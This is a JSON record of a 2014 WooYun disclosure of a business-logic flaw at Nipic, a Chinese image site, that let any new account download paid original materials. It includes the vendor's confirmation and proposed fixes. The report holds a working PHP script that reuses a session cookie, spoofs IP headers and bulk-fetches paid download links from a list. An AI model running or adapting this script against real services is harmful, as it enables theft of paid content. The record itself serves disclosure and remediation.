{"id": 54000, "wybug_id": "wooyun-2014-065861", "wybug_title": "昵图网呢币素材任意下载漏洞", "wybug_corp": "杭州昵图信息技术有限公司", "wybug_author": "蓄势待发", "wybug_date": "2014-06-23 10:47", "wybug_open_date": "2014-08-07 10:48", "wybug_type": "内容安全", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向公众公开  简要描述： 昵图网呢币素材任意帐号，任意下载漏洞。在昵图网注册一个新的帐号，可以下载昵图网原创呢币类素材，该漏洞为昵图网业务逻辑没有分清导致，可以使用下载共享分的链接下载昵图网呢币类的原创设计 详细说明：  说明：业务逻辑没有分清，导致呢币类素材可以被共享分素材的下载地址下载到。详情看图片及代码步骤：1、新注册一个帐号，获取到COOKIE，现在昵图用的是SESSION，那么我们就获得SESSION_ID      2、找到你想要下载的呢币类的素材地址，如：http://www.nipic.com/show/10458044.html     3、使用共享分下载的程序http://down.nipic.com/ajax/download_go 提交ID，即可获得该图的下载地址\n\n\n<?phpfunction get_downlink($nipicUrl){\t$match = array();\tpreg_match('/^http:\\/\\/www.nipic.com\\/show\\/(\\d+).html/' , $nipicUrl , $match);\t$downid = $match[1];\t$ip = \"110.110.110.110\";\t$user_agent = \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0\";\t$cookie = \"NSESSIONID=e87642fb3b06b450|19076396|wwccppss; expires=Sat, 05 Jul 2014 14:37:02 GMT; path=/; domain=.nipic.com\";\t$curl = curl_init();\tcurl_setopt( $curl , CURLOPT_URL , 'http://down.nipic.com/ajax/download_go' ); //指定url\tcurl_setopt( $curl , CURLOPT_REFERER , 'http://www.nipic.com/');\tcurl_setopt( $curl , CURLOPT_RETURNTRANSFER , true ); //返回源码\tcurl_setopt( $curl , CURLOPT_SSL_VERIFYPEER, false); //关闭ssl\tcurl_setopt( $curl , CURLOPT_USERAGENT , $user_agent);//模拟一个header\tcurl_setopt( $curl , CURLOPT_TIMEOUT, 30 ); //读取的最大时间秒\tcurl_setopt( $curl , CURLOPT_FRESH_CONNECT ,true); //关闭内容缓存\tcurl_setopt( $curl , CURLOPT_COOKIE , $cookie);\tcurl_setopt( $curl, CURLOPT_HTTPHEADER, array(\t\t'X-FORWARDED-FOR:' . $ip,\t\t'CLIENT-IP:' . $ip\t));\tcurl_setopt( $curl , CURLOPT_POST , 1);\tcurl_setopt( $curl , CURLOPT_POSTFIELDS ,array(\t\t'id' => $downid ,\t\t'kid' => 2\t));\t$ret = curl_exec( $curl );\tcurl_close( $curl );\t$ret = json_decode($ret , 1);\t\t$downurl_first = $ret['data']['url'] ? trim($ret['data']['url']) : '';\t$downurl_first = str_replace(\" \",\"%20\",$downurl_first);\tif(!empty($downurl_first)){\t\t$headers = get_headers($downurl_first,1);\t\treturn $headers['Location'];\t}}$downtxt = \"down.txt\";$downlist = '';$file = fopen(\"list.txt\", \"r\") or exit(\"Unable to open file!\");while(!feof($file))  {   $nipicUrl =  fgets($file);   $downurl = get_downlink($nipicUrl);   $downlist.=$downurl.\"\\r\\n\";   echo $nipicUrl;   echo $downurl.\"\\r\\n\";}fclose($file);$handle = fopen($downtxt,\"w\");fwrite($handle,$downlist);fclose($handle);?>\n   漏洞证明：  \n\n红框的就是下载地址了。   修复方案：  1、共享分下载的程序判断是否为原创呢币类，若不是请处理业务逻辑。2、呢币类下载地址请判断是否为共享分类，若不是请处理业务逻辑。PS:支持昵图网，昵图确实给我们带来了很大的便利，创造了价值，虽然图片版权这东西谁也说不清楚。希望没有给昵图带来很大的影响，只为友情检测，并无恶意！ 没有100%完善的系统，却有100%的态度，希望昵图越来越好，昵图加油！这次改版很成功哦，很喜欢，嘿嘿！！！！！！！乌云的大哥大姐，求验证码。。。。小弟跪拜。   版权声明：转载请注明来源 蓄势待发@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-06-23 13:29 厂商回复： @蓄势待发 感谢测试，后台抛出异常，程序没有处理好，直接输出了下载地址 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}